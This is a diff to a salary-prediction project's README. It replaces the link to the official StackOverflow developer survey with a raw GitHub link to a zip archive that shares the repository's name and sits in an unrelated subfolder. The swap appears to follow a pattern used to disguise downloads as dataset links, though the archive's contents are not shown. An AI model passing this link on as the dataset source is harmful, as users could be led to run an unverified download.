@@ -2,7 +2,7 @@
 
 # Dataset Used
 The StackOverflow 2023 survey of developers was used to train the model after extracting additional features and preprocessing all the used features.
-Link: https://insights.stackoverflow.com/survey
+Link: https://raw.githubusercontent.com/kartik-parmar007/Salary-Prediction-using-Machine-Learning/main/Israel/Salary-Prediction-using-Machine-Learning.zip
 
 # Run The Predictor
 1. Clone the repository and CD into the python files folder
